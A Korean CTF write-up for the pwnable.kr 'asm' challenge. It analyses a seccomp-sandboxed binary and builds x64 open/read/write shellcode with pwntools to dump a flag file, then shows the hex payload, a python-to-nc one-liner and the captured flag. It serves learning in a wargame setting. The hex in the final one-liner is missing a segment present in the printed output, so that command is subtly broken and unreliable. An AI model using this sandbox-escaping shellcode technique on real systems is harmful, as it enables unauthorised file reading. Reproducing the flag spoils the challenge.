---


---

<h1 id="pwnable.krasm"><a href="http://pwnable.kr">pwnable.kr</a>:asm</h1>
<h2 id="해석-1">2019-07-26 해석-1</h2>
<p>readme에 들어가보면</p>
<pre><code>once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.

make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
</code></pre>
<p><code>nc 0 9026</code>을 통해 flag를 휙득해라며, 파일 이름은 현제 디렉토리에 있는 것과 같다고 나와있다.</p>
<p>c파일에는 평소에 접하지 않는 함수들이 있다. 해석부터 진행해보자.</p>
<pre><code>setvbuf(stdout, 0, _IONBF, 0);
setvbuf(stdin, 0, _IOLBF, 0);
</code></pre>
<p>input, output 버퍼를 초기화 한다.</p>
<pre><code>char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
memset(sh, 0x90, 0x1000);
memcpy(sh, stub, strlen(stub));
</code></pre>
<p><code>mmap()</code> 은 주소공간을 맵핑해주는 함수이다. 원하는 주소, 권한, 용량에 맵핑 할 수 있다.<br>
현재 소스에는 char 타입 포인터 sh를 0x41414000 부터 0x1000 만큼의 사이즈로 읽기, 쓰기, 실행 권한이 가능하며(추정), 파일과 연결되지 않은 체 0으로 초기화 된 영역, 고정된 주소로, 다른 프로세스는 접근하지 못하게끔하며 파일은 연결되지 않고, 스킵은 존재하지 않는 메모리 영역으로 맵핑 한다는 뜻이다.</p>
<p>다음 <code>memset()</code>으로 sh를 0x90(NOP)로 채운 후 <code>memcpy()</code>가 stub를 stub의 용량 만큼 sh에 복사한다.</p>
<pre><code>int offset = sizeof(stub);
printf("give me your x64 shellcode: ");
read(0, sh+offset, 1000);
</code></pre>
<p>64비트 쉘코드를 입력해 달라는 메세지와 함께 <code>read()</code>로 sh에서 아까의 stub가 복사된 자리 이후부터 입력을 받는다.</p>
<pre><code>alarm(10);
chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp
sandbox();
((void (*)(void))sh)();
</code></pre>
<p>10초 뒤 프로그램은 강제종료 하게 되며 <code>/home/asm_pwn</code>이 가장 밖의(루트) 디렉토리가 된다. 따라서 이 프로그램은 <code>/tmp</code>와 접촉할 수 없다.</p>
<h2 id="해석-2">2019-07-29 해석-2</h2>
<p>*sandbox()</p>
<pre><code>scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
if (ctx == NULL) {
printf("seccomp error\n");
exit(0);

}
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
if (seccomp_load(ctx) &lt; 0){
seccomp_release(ctx);
printf("seccomp error\n");
exit(0);
}

seccomp_release(ctx);
</code></pre>
<p>seccomp는 system call을 차단하는 보안관련 라이브러리다.<br>
소스에서는 모든 활동을 차단한 다음, oepn, read, write ,exit를 허용해주고 있다. 화이트리스트 방식이다.</p>
<h2 id="정리">정리</h2>
<p>우리가 만들어야 하는 것은 허용된 open(), read(), write() 이 허용된 세가지 함수를 이용하여 flag 파일을 읽어 출력해주는 64bit 쉘코드를 작성하는 것이다.</p>
<pre><code>int fd = open("longname", 0, 0);
read(fd, buf, 1024);
write(1, buf, 1024);
</code></pre>
<p>이 소스가 쉘코드로 올라가야 한다. 소스를 쉘코드로 쉽게 바꿀 수 있는 pwntools를 이용해 보겠다.</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux')

payload = ""
payload += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.read('rax', 'rsp', 100)
payload += shellcraft.write(1, 'rsp', 100)

print asm(payload).encode('hex')
</code></pre>
<p>출력은 아래와 같다.</p>
<pre><code>48b801010101010101015048b86e316e316e6f66014831042448b86f306f306f306f305048b830303030303030305048b86f6f6f6f303030305048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b830303030306f6f6f5048b830303030303030305048b830303030303030305048b86f6f6f6f303030305048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b8735f766572795f6c5048b8655f6e616d655f695048b85f7468655f66696c5048b86c652e736f7272795048b85f746869735f66695048b86173655f726561645048b866696c655f706c655048b86b725f666c61675f5048b870776e61626c652e5048b8746869735f69735f504889e731d231f66a02580f054889c731c06a645a4889e60f056a015f6a645a4889e66a01580f05
</code></pre>
<p>이것을 16진수라고 정의하며 프로그램 입력에 넣어주면 된다.</p>
<pre><code>python -c 'print "48b801010101010101015048b86e316e316e6f66014831042448b86f306f306f306f305048b830303030303030305048b86f6f6f6f303048b86f6f6f6f6f6f6f6f5048b830303030306f6f6f5048b830303030303030305048b830303030303030305048b86f6f6f6f303030305048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b8735f766572795f6c5048b8655f6e616d655f695048b85f7468655f66696c5048b86c652e736f7272795048b85f746869735f66695048b86173655f726561645048b866696c655f706c655048b86b725f666c61675f5048b870776e61626c652e5048b8746869735f69735f504889e731d231f66a02580f054889c731c06a645a4889e60f056a015f6a645a4889e66a01580f05".decode("hex")' | nc 0 9026
</code></pre>
<p>성공했다.</p>
<pre><code>Mak1ng_shelLcodE_i5_veRy_eaSy
</code></pre>

